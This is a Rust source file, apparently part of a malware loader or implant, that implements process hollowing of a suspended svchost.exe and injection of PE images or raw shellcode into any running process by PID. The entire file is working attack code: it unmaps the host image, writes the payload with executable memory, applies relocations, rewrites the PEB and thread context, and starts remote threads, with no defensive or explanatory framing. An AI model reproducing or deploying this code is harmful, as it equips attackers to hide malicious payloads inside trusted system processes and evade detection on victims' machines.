use anyhow::{anyhow, Result};
use std::ffi::c_void;

/// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
#[cfg(windows)]
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use std::ptr::null_mut;
    use winapi::um::processthreadsapi::{
        CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext, PROCESS_INFORMATION,
        STARTUPINFOA,
    };
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
    use winapi::um::winnt::{
        CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64,
        IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS,
    };
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
    use winapi::shared::basetsd::SIZE_T;

    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!("hollow_and_execute: payload is not a PE (no MZ header)"));
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    let e_lfanew = unsafe { (*dos).e_lfanew } as usize;
    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!("hollow_and_execute: PE too small for NT headers"));
    }
    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    unsafe {
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
        }
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid NT signature"));
        }

        let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
        let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

        let host = b"C:\\Windows\\System32\\svchost.exe\0";
        let mut si: STARTUPINFOA = zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let ok = CreateProcessA(
            host.as_ptr() as _,
            null_mut(), null_mut(), null_mut(), 0,
            CREATE_SUSPENDED,
            null_mut(), null_mut(), &mut si, &mut pi,
        );
        if ok == 0 {
            return Err(anyhow!(
                "CreateProcessA failed: {}",
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        // NtUnmapViewOfSection to hollow the original image
        let ntdll_handle = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as _);
        if !ntdll_handle.is_null() {
            let unmap_proc = GetProcAddress(ntdll_handle, b"NtUnmapViewOfSection\0".as_ptr() as _);
            if !unmap_proc.is_null() {
                type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
                let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_proc);

                let mut ctx: CONTEXT = zeroed();
                ctx.ContextFlags = CONTEXT_FULL;
                GetThreadContext(pi.hThread, &mut ctx);

                // In a newly created x64 process, Rdx holds the PEB address
                let peb_ptr = ctx.Rdx as *const u8;
                let mut remote_image_base: usize = 0;
                ReadProcessMemory(
                    pi.hProcess,
                    peb_ptr.add(0x10) as _,
                    &mut remote_image_base as *mut _ as _,
                    std::mem::size_of::<usize>(),
                    null_mut(),
                );
                nt_unmap(pi.hProcess, remote_image_base as _);
            }
        }

        let remote_base_ptr = VirtualAllocEx(
            pi.hProcess, preferred_base as _,
            image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        );
        let remote_base_ptr = if remote_base_ptr.is_null() {
            let fallback = VirtualAllocEx(
                pi.hProcess, null_mut(),
                image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            );
            if fallback.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Err(anyhow!("VirtualAllocEx failed for hollowing"));
            }
            fallback
        } else {
            remote_base_ptr
        };

        let remote_base = remote_base_ptr as usize;
        let mut written: SIZE_T = 0;

        // Write PE headers
        WriteProcessMemory(
            pi.hProcess, remote_base_ptr,
            payload.as_ptr() as _,
            (*nt).OptionalHeader.SizeOfHeaders as usize,
            &mut written,
        );

        // Write sections
        let num_sections = (*nt).FileHeader.NumberOfSections as usize;
        let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for i in 0..num_sections {
            let sec = &*first_section.add(i);
            let raw_off = sec.PointerToRawData as usize;
            let raw_sz = sec.SizeOfRawData as usize;
            let virt_sz = *sec.Misc.VirtualSize() as usize;
            let copy_sz = raw_sz.min(virt_sz);
            if raw_off + copy_sz > payload.len() || copy_sz == 0 { continue; }
            let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
            WriteProcessMemory(pi.hProcess, dst, payload.as_ptr().add(raw_off) as _, copy_sz, &mut written);
        }

        let delta = remote_base as isize - preferred_base as isize;
        if delta != 0 {
            apply_relocations_remote(pi.hProcess, remote_base, nt, payload, delta)?;
        }

        // Update PEB.ImageBaseAddress
        let mut ctx: CONTEXT = zeroed();
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &mut ctx);
        let peb_ptr = ctx.Rdx as *const u8;
        WriteProcessMemory(
            pi.hProcess, peb_ptr.add(0x10) as _,
            &remote_base as *const _ as _, std::mem::size_of::<usize>(), &mut written,
        );

        // Set new entry point
        ctx.Rcx = (remote_base + entry_point_rva) as u64;
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn apply_relocations_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
    use winapi::shared::basetsd::SIZE_T;

    let reloc_dir = &(*nt).OptionalHeader
        .DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 { return Ok(()); }

    let reloc_start = reloc_dir.VirtualAddress as usize;
    let reloc_end = reloc_start + reloc_dir.Size as usize;
    if reloc_end > payload.len() { return Ok(()); }

    let mut offset = reloc_start;
    while offset + 8 <= reloc_end {
        let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size = u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 { break; }
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > reloc_end { break; }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            if typ == 10 { // IMAGE_REL_BASED_DIR64
                let target = (remote_base + page_rva + rel) as *mut c_void;
                let mut val: u64 = 0;
                let mut rd: SIZE_T = 0;
                ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
                val = val.wrapping_add(delta as u64);
                let mut wr: SIZE_T = 0;
                WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
            }
        }
        offset += block_size;
    }
    Ok(())
}

/// Inject a PE or shellcode payload into an existing process identified by PID.
#[cfg(windows)]
pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
    use std::ptr::null_mut;
    use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE,
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS,
    };
    use winapi::shared::basetsd::SIZE_T;

    unsafe {
        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if hprocess.is_null() {
            return Err(anyhow!(
                "OpenProcess(pid={}) failed: {}",
                pid,
                winapi::um::errhandlingapi::GetLastError()
            ));
        }

        let is_pe = payload.len() > 2 && payload[0] == b'M' && payload[1] == b'Z';

        if is_pe {
            let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
                CloseHandle(hprocess);
                return Err(anyhow!("inject_into_process: invalid DOS signature"));
            }
            let e_lfanew = (*dos).e_lfanew as usize;
            let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
            if (*nt).Signature != IMAGE_NT_SIGNATURE {
                CloseHandle(hprocess);
                return Err(anyhow!("inject_into_process: invalid NT signature"));
            }

            let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
            let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
            let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

            let remote_mem = VirtualAllocEx(
                hprocess, preferred_base as _, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            );
            let remote_mem = if remote_mem.is_null() {
                VirtualAllocEx(hprocess, null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            } else { remote_mem };

            if remote_mem.is_null() {
                CloseHandle(hprocess);
                return Err(anyhow!("VirtualAllocEx(pid={}) failed", pid));
            }

            let remote_base = remote_mem as usize;
            let mut written: SIZE_T = 0;
            WriteProcessMemory(hprocess, remote_mem, payload.as_ptr() as _, (*nt).OptionalHeader.SizeOfHeaders as usize, &mut written);

            let num_sections = (*nt).FileHeader.NumberOfSections as usize;
            let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
            for i in 0..num_sections {
                let sec = &*first_section.add(i);
                let raw_off = sec.PointerToRawData as usize;
                let raw_sz = sec.SizeOfRawData as usize;
                let virt_sz = *sec.Misc.VirtualSize() as usize;
                let copy_sz = raw_sz.min(virt_sz);
                if raw_off + copy_sz > payload.len() || copy_sz == 0 { continue; }
                let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
                WriteProcessMemory(hprocess, dst, payload.as_ptr().add(raw_off) as _, copy_sz, &mut written);
            }

            let delta = remote_base as isize - preferred_base as isize;
            if delta != 0 {
                apply_relocations_remote(hprocess, remote_base, nt, payload, delta)?;
            }

            let entry = (remote_base + ep_rva) as *mut c_void;
            let hthread = CreateRemoteThread(
                hprocess, null_mut(), 0,
                Some(std::mem::transmute(entry)),
                null_mut(), 0, null_mut(),
            );
            if hthread.is_null() {
                CloseHandle(hprocess);
                return Err(anyhow!("CreateRemoteThread(pid={}) failed", pid));
            }
            CloseHandle(hthread);
        } else {
            // Shellcode injection
            let remote_mem = VirtualAllocEx(
                hprocess, null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
            );
            if remote_mem.is_null() {
                CloseHandle(hprocess);
                return Err(anyhow!("VirtualAllocEx(shellcode, pid={}) failed", pid));
            }
            let mut written: SIZE_T = 0;
            WriteProcessMemory(hprocess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written);
            let hthread = CreateRemoteThread(
                hprocess, null_mut(), 0,
                Some(std::mem::transmute(remote_mem)),
                null_mut(), 0, null_mut(),
            );
            if hthread.is_null() {
                CloseHandle(hprocess);
                return Err(anyhow!("CreateRemoteThread(shellcode, pid={}) failed", pid));
            }
            CloseHandle(hthread);
        }

        CloseHandle(hprocess);
    }
    Ok(())
}

#[cfg(not(windows))]
pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
    Err(anyhow!("hollow_and_execute not supported on this platform"))
}

#[cfg(not(windows))]
pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
    Err(anyhow!("inject_into_process not supported on this platform"))
}
